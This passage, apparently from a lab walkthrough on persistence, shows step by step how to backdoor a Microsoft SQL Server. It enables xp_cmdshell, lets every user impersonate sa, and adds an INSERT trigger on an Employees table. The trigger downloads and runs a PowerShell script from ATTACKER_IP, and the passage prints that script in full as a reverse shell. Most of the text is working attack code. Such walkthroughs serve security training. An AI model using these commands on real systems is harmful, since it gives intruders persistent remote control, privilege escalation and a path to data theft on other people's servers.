Open Microsoft SQL Server Management Studio 18, available from the start menu. When asked for authentication, just use Windows Authentication (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on the New Query button to open the query editor:

Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable xp_cmdshell.

	sp_configure 'Show Advanced Options',1;
	RECONFIGURE;
	GO
	
	sp_configure 'xp_cmdshell',1;
	RECONFIGURE;
	GO

After this, we must ensure that any website accessing the database can run xp_cmdshell. By default, only database users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the sa user, which is the default database administrator:

	USE master
	
	GRANT IMPERSONATE ON LOGIN::sa to [Public];

After all of this, we finally configure a trigger. We start by changing to the HRDB database:

	USE HRDB

Our trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database:

	CREATE TRIGGER [sql_backdoor]
	ON HRDB.dbo.Employees 
	FOR INSERT AS
	
	EXECUTE AS LOGIN = 'sa'
	EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';

Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:

	$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

	$stream = $client.GetStream();
	[byte[]]$bytes = 0..65535|%{0};
	while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
	    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	    $sendback = (iex $data 2>&1 | Out-String );
	    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
	    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	    $stream.Write($sendbyte,0,$sendbyte.Length);
	    $stream.Flush()
	};
	
	$client.Close()

We will need to open two terminals to handle the connections involved in this exploit:

- The trigger will perform the first connection to download and execute evilscript.ps1. Our trigger is using port 8000 for that.
- The second connection will be a reverse shell on port 4454 back to our attacker machine.
